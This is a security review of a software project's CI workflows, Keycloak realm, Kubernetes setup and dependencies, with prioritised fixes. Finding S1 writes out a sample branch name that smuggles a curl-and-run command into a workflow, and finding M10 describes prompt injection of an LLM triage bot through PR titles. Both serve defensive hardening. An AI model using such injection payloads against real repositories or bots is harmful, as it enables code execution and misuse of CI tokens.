# Security review

Two parts:

1. **Scanner triage**: an automated scan (1,451 files, 2,496 packages checked against OSV.dev) reported **62 findings** (2 critical, 22 high, 26 medium, 12 low). Each one was checked against the code: **9 are real, none critical**. The other 53 are false positives or accepted risks.
2. **Manual review** of configuration and design issues a pattern scanner cannot see (auth, Kubernetes, CI). Known CVEs in dependencies are tracked separately and are not repeated there.

## Summary

| Source | Fix soon | Low risk / hardening |
|---|---|---|
| Scanner | 3 | 6 |
| Manual review | 4 | 6 |

## 1. Scanner findings: real

| # | Priority | File | Issue | Why it is real | Fix |
|---|---|---|---|---|---|
| S1 | **High** | `.github/workflows/clean-cache-post-merge.yml:24-27` | `${{ github.head_ref }}` and `${{ github.event.inputs.branch }}` interpolated straight into `run:` | Runs on `pull_request_target` (base repo context, token with `actions: write`). The branch name comes from the fork, so a branch named like `` a$(curl${IFS}x.sh\|sh) `` runs commands when the PR is closed | Pass through `env: HEAD_REF: ${{ github.head_ref }}` and use `"$HEAD_REF"` |
| S2 | Medium | `.github/workflows/format-{backend-on-request,ena-deposition-on-dispatch,website-on-dispatch}.yml:41-42` | `git push origin HEAD:${{ github.head_ref }}` | Same injection pattern. Lower risk: trigger is `pull_request` (forks get a read-only token) and it needs the `format_me` label set by a maintainer | Same `env:` + `"$HEAD_REF"` change |
| S3 | Medium | `website/package-lock.json:15852` | `zod` 3.25.76 (GHSA-mrhx-c7xc-m3w5, memory exhaustion) | Production dependency of the website, used to validate config and API responses | Upgrade to a fixed 3.x release or migrate to zod ≥ 4.6.6 |
| S4 | Low | `website/package-lock.json:7326` | `deepmerge-ts` 7.1.5 (stack overflow on recursive objects) | In production, but only fails on cyclic object graphs, which do not come from external input | Upgrade to ≥ 8.0.0 when the parent package allows it |
| S5 | Low | `keycloak/keycloakify/yarn.lock` | `tar` 6.2.1, `brace-expansion`, `ip-address`, `zod`, `glob`, `minimatch` vulnerable | Only used in the theme build (`builder` stage); the final image only ships the `.jar` files. No third-party input | Let Dependabot update; `tar` ≥ 7.5.21 is the most relevant |
| S6 | Low | `cli/uv.lock:361`, `docs/package-lock.json:4456`, `integration-tests/package-lock.json:1958` | `jaraco-context` 6.0.1, `i18next` 26.3.0, `minimatch` 10.2.6 | CLI tooling, static docs site and tests; the vulnerable code paths get no external input | Update via Dependabot |
| S7 | Low | `raw-reads-processing/Dockerfile:4` | `FROM curlimages/curl:latest` | The build changes without notice and is not reproducible | Pin tag and digest (`curlimages/curl:8.x@sha256:...`) |
| S8 | Low | `kubernetes/loculus/values.yaml:2945` | Default database passwords (`password`, `unsecure`) | Development defaults; a risk only if a production install does not override them | Document that production must override them (sealed secrets), or fail the deploy when the default is used |
| S9 | Low | `integration-tests/AGENTS.md:19,25,30` | `curl ... \| bash` to install k3d, helm and uv | Instructions for developer/agent machines, fetching from `main` with no pinned version | Pin versions (`TAG=v5.x`, `DESIRED_VERSION`) or install from a package manager |

## 2. Manual review: configuration and design issues

| # | Priority | Where | Issue | Impact | Fix |
|---|---|---|---|---|---|
| M1 | **High** | `kubernetes/loculus/templates/keycloak-config-map.yaml` (realm) | No `bruteForceProtected` in the realm, and `backend-client` is a public client with `directAccessGrantsEnabled: true` (password grant) | Anyone can guess passwords against `/realms/loculus/protocol/openid-connect/token` without a client secret and without lockout or delay. Keycloak's default is brute-force protection **off** | Set `"bruteForceProtected": true` (with `failureFactor`, `waitIncrementSeconds`, `maxFailureWaitSeconds`). Check whether the password grant is still needed by the CLI/preprocessing; if so, move those to a separate confidential client and turn it off on `backend-client` |
| M2 | Medium | same realm | No `passwordPolicy`; `registrationAllowed: true` and `verifyEmail: false` by default (`values.yaml:2865-2867`) | Self-registered accounts can use trivial passwords, and with no email check, accounts can be created in bulk with any address | Add e.g. `"passwordPolicy": "length(12) and notUsername and notEmail and passwordBlacklist"`; recommend `verifyEmail: true` for public instances |
| M3 | Medium | same realm: `accessTokenLifespan: 36000`, `ssoSessionIdleTimeout: 36000` | Access tokens live 10 hours | The backend validates JWTs locally, so a leaked token (logs, shared scripts, browser) keeps working for 10 h even after logout or a role change | Shorten to 5–15 min and rely on the refresh token the website already stores; give CLI/pipeline clients a separate client or token policy |
| M4 | Medium | `kubernetes/loculus/templates/ingressroute.yaml:129-146`, `keycloak-deployment.yaml:79-89` | The whole Keycloak host, including `/admin` and the `master` realm, is public; the admin user is the fixed name `admin` with password-only login | The admin console is open to password guessing from the internet, and the `master` realm does not get the brute-force settings from M1 | Block `/admin` and `/realms/master` at the ingress (IP allow list or a separate internal host); enable brute-force protection and OTP on `master` |
| M5 | Low | `kubernetes/loculus/templates/` (all deployments) | No `securityContext` in any pod (`runAsNonRoot`, `readOnlyRootFilesystem`, `allowPrivilegeEscalation: false`, dropped capabilities) | A compromised container keeps root and full default capabilities, which makes a breakout or lateral move easier | Add a shared pod/container `securityContext` helper and enable it service by service |
| M6 | Low | `kubernetes/loculus/templates/` | No `NetworkPolicy` | Any pod in the cluster can reach PostgreSQL, MinIO and the Keycloak DB directly | Default-deny policies plus explicit allow rules (backend → DB, keycloak → keycloak-DB, etc.) |
| M7 | Low | website (Astro middleware) and ingress | No security headers: no `Content-Security-Policy`, `X-Frame-Options` / `frame-ancestors`, `Strict-Transport-Security`, `Referrer-Policy` | The logged-in submission, approval and group-management pages can be framed (clickjacking), and there is no CSP fallback if an XSS gets in | Add a Traefik `headers` middleware or set the headers in the Astro middleware; start with `frame-ancestors 'none'` and HSTS, then CSP in report-only mode |
| M8 | Low | `.github/workflows/*.yml` | Third-party actions pinned by tag, not commit SHA (`docker/*`, `lewagon/wait-on-check-action`, `creyD/prettier_action`, `peaceiris/actions-gh-pages`, `nick-fields/retry`, `fergusmacd/github-action-usage`, `astral-sh/setup-uv`, `mamba-org/setup-micromamba`, `azure/setup-helm`) | A moved or hijacked tag runs new code with the job's secrets (registry login, deploy keys, CI tokens), as in the 2025 `tj-actions` incident | Pin to SHAs with a version comment; Dependabot keeps them updated |
| M9 | Low | 19 workflows with no `permissions:` at all (e.g. `backend-tests.yml`, `website-tests.yml`, `datasets-mirror*.yml`, `ncbi-taxonomy-db.yml`, `add-preview-url.yml`) | `GITHUB_TOKEN` gets the repository default scope | If the repo default is read/write, every test job gets a write token | Add `permissions: contents: read` at the top of each workflow, and set the repo default to read-only |
| M10 | Low | `.github/workflows/issue-triage.yml:118` | PR title inserted into the LLM prompt of a job with `pull-requests: write` | A crafted PR title can steer the triage bot (prompt injection), e.g. to apply wrong labels or post misleading comments. Limited by `--allowedTools` | Pass the title as data (tell the model to read it with `gh pr view`) and keep the tool allow list minimal |
| M11 | Info | `website/src/pages/-testpage/index.mdx` | Placeholder page served in production at `/-testpage` (Astro only hides files starting with `_`) | No security impact; leftover test content on every instance | Rename to `_testpage` or delete |

## 3. Checked and fine

| Area | Where | Result |
|---|---|---|
| Login redirect (`returnTo`) | `website/src/pages/auth/login.ts` | Same-origin check, with tests for absolute and protocol-relative URLs; uses PKCE, `state` and `nonce` |
| Auth cookies | `website/src/middleware/authMiddleware.ts:283-292`, `utils/authRequestCookies.ts:120` | `httpOnly`, `sameSite: 'lax'`, `secure` unless `insecureCookies` (dev) |
| CSRF disabled in backend | `backend/.../config/SecurityConfig.kt:35` | Fine: the backend only accepts bearer tokens, which browsers never attach automatically |
| Spring Actuator | `backend/src/main/resources/application.properties:24-31` | Separate port, only `health` exposed |
| Public endpoints | `SecurityConfig.kt:37-53` | Only root, health, error, OpenAPI docs and `OPTIONS`; `/debug/*` requires `super_user`; everything else requires authentication |
| MinIO bucket policy | `kubernetes/loculus/templates/minio-deployment.yaml:8-23` | Anonymous `GetObject` only for objects tagged `public=true` |
| NodePort services | `kubernetes/loculus/templates/_service-type.tpl` | `ClusterIP` when `environment: server`; NodePort only in local/dev setups |

## Next steps

| Order | Action | Items |
|---|---|---|
| 1 | One PR replacing `${{ github.head_ref }}` / `${{ github.event.inputs.* }}` with `env:` in the 4 workflows | S1, S2 |
| 2 | Keycloak realm hardening: brute-force protection, password policy, shorter token lifespan, review the password grant | M1, M2, M3 |
| 3 | Restrict the Keycloak admin console at the ingress | M4 |
| 4 | Upgrade `zod` and `deepmerge-ts` in the website and run the tests | S3, S4 |
| 5 | CI hardening: SHA-pinned actions, explicit `permissions:`, triage prompt | M8, M9, M10 |
| 6 | Kubernetes hardening: `securityContext`, `NetworkPolicy`, security headers | M5, M6, M7 |
| 7 | Small cleanups: pin the `raw-reads-processing` base image and installer versions, document production secrets, remove `/-testpage` | S7, S8, S9, M11 |
| 8 | Let Dependabot handle the rest | S5, S6 |

## Dive deeper

- [Analyses: the generated charts, with takeaways](analyses.md)
- [Bottlenecks and optimization opportunities](bottlenecks.md)
- [Tasks: 18 concrete contributions](../tasks/README.md)
- [Data map: where data lives](data-map.md)
- [Python pipelines](python-pipelines.md)
- [CVEs and advisories](cves.md)
